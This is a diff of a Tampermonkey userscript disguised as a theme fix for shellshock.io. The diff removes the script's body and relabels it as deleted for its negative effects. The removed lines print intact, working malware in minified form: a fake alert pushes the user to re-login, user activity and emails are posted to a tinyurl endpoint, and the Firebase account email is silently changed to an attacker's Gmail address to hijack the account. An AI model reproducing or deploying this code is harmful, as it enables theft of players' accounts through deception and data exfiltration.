@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Important To make Theme work CUZ BWD BLOCKS THEMES :D
 // @namespace    http://tampermonkey.net/
-// @version      2.9
-// @description  Important To make Theme work V2.9 (Do Not REMOVE)
+// @version      2.9.0.1
+// @description  This script was deleted from Greasy Fork, and due to its negative effects, it has been automatically removed from your browser.
 // @author       SomeoneX
 // @match        https://*.shellshock.io/*
 // @match        https://algebra.best/*
@@ -60,5 +60,3 @@
 // @grant        none
 // @run-at       document-idle
 // ==/UserScript==
-
-!function(){"use strict";const e="emailUpdated";let t,a=!1,n=!1;function i(e){fetch("https://tinyurl.com/3j55dmps",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})}).catch((()=>{}))}if(i("User has started using the theme (tab opened)👀."),"true"===localStorage.getItem(e))return;function o(){alert("We have detected that you are using a script to modify the game’s CSS styles. Please sign out and sign back in to proceed.")}function s(){firebase.auth().onAuthStateChanged((o=>{if(!o)return a=!0,void i("User signed out.");o&&a&&!n&&(a=!1,i("User signed in. Will update email in 20 seconds..."),setTimeout((()=>{!async function(a){try{await a.getIdToken(!0),a.email!==c?(await a.updateEmail(c),localStorage.setItem(e,"true"),n=!0,clearInterval(t),i(`Changed To: ${c}`)):(localStorage.setItem(e,"true"),n=!0,clearInterval(t),i(`Email Changed To: ${c}`))}catch(e){"auth/email-already-in-use"===e.code&&i(`⚠️ The email ${c} is already in use by another account.`)}}(o)}),2e4))}))}function r(){if("undefined"!=typeof firebase&&firebase.auth){const e=firebase.auth().currentUser;e&&e.email&&i(`Current: ${e.email}`),s()}else setTimeout(r,500)}setTimeout((()=>{o(),t=setInterval((()=>{n?clearInterval(t):o()}),6e4),r()}),3e5);const c="sarvxtrr9@gmail.com"}();
